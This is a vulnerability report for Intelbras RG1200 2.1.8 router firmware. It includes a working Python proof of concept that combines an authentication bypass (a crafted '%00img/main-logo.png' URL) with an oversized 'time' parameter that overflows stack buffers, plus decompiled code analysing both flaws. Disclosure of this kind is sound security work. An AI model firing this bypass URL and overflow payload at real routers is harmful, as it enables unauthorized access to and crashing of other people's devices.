# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`setSmartPowerManagement`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`setSmartPowerManagement`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, an attacker can trigger a stack buffer overflow in `setSmartPowerManagement`. The handler reads the user-controlled `time` parameter and parses it via unbounded `sscanf` into multiple small fixed-size stack buffers.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
  base = f"http://{target_ip}:{port}"
  url = f"{base}/goform/setSmartPowerManagement%00img/main-logo.png"

  data = {
    "powerSavingEn": "1",
    "time": "A" * 32 + ":" + "B" * 32 + "-" + "C" * 32 + ":" + "D" * 32,
    "powerSaveDelay": "1",
    "ledCloseType": "allClose",
  }

  headers = {
    "Cookie": cookie,
  }

  r = requests.post(url, data=data, headers=headers, timeout=10)
  print("status:", r.status_code)
  print(r.text[:2000])


if __name__ == "__main__":
  if len(sys.argv) < 2:
    print("usage: python poc.py <target_ip> [port]")
    sys.exit(1)
  ip = sys.argv[1]
  port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
  exploit(ip, port=port)
```

## Cause Analysis

### 1. Authentication Bypass — Raw URL vs Decoded Path Inconsistency

The HTTP request parsing logic in `websParseFirst` (0x42ea1c) stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` → `websUrlParse`:

```c
// websParseFirst (0x42ea1c) — sets wp->url = raw, wp->path = decoded
int __cdecl websParseFirst(webs_t wp, char_t *text)
{
    url = strtok(0, " \t\n");                         // raw URL from HTTP request line
    if ( websUrlParse(url, &buf, &host, &path, &port, &query, &proto, 0, &ext) >= 0 )
    {
        wp->url = bstrdup(url);      // ← raw URL, NOT decoded
        wp->path = bstrdup(path);    // ← decoded path from websDecodeUrl
        // ...
    }
}
```

In `R7WebsSecurityHandler` (0x434c34), the whitelist check is performed using `strstr(url, ...)` on the **raw** `url` parameter (which is `wp->url`). By crafting a raw URL such as `/goform/setSmartPowerManagement%00img/main-logo.png`, the security handler matches the whitelisted substring and returns 0 (allow) without enforcing authentication:

```c
// R7WebsSecurityHandler (0x434c34) — whitelist check on raw URL
if ( !strncmp(url, "/public/", 8u)
  || !strncmp(url, "/lang/", 6u)
  || strstr(url, "img/main-logo.png")    // ← BYPASS: matches %00img/main-logo.png in raw URL
  || strstr(url, "reasy-ui-1.0.3.js")
  // ...
{
    return 0;  // ← Authentication bypassed
}
```

Meanwhile, `websDecodeUrl` (0x430ebc) decodes `%00` to a null byte, causing `websFormHandler` (0x415710) to receive the **decoded** path `/goform/setSmartPowerManagement` and dispatch to the handler.

### 2. Stack Buffer Overflow — Unbounded sscanf into 8-byte buffers in setSmartPowerManagement

`setSmartPowerManagement` (0x485ee4) obtains `time = websGetVar(wp, "time", ...)` and parses it via unbounded `sscanf` into four 8-byte stack buffers:

```c
// setSmartPowerManagement (0x485ee4)
void __cdecl setSmartPowerManagement(webs_t wp, char_t *path, char_t *query)
{
    char *time;
    char hour_start[8];     // ← 8-byte stack buffer
    char min_start[8];      // ← 8-byte stack buffer
    char hour_end[8];       // ← 8-byte stack buffer
    char min_end[8];        // ← 8-byte stack buffer
    char starttime[128];
    char endstart[128];

    memset(hour_start, 0, sizeof(hour_start));
    // ...
    time = websGetVar(wp, "time", "00:00-7:30");
    // ...
    sscanf(time, "%[^:]:%[^-]-%[^:]:%s", hour_start, min_start, hour_end, min_end);  // ← OVERFLOW: all 4 unbounded
    sprintf(starttime, "%s:%s", hour_start, min_start);    // further amplifies the overflowed data
    sprintf(endstart, "%s:%s", hour_end, min_end);
    SetValue("sys.powersleep.start_time", starttime);
    SetValue("sys.powersleep.end_time", endstart);
}
```

The `sscanf` format `"%[^:]:%[^-]-%[^:]:%s"` has no width limits. A `time` value like `"A"*32 + ":" + "B"*32 + "-" + "C"*32 + ":" + "D"*32` writes 32 bytes into each 8-byte buffer, overflowing adjacent stack variables (`starttime`, `endstart`). The subsequent `sprintf` calls further propagate corrupted data.

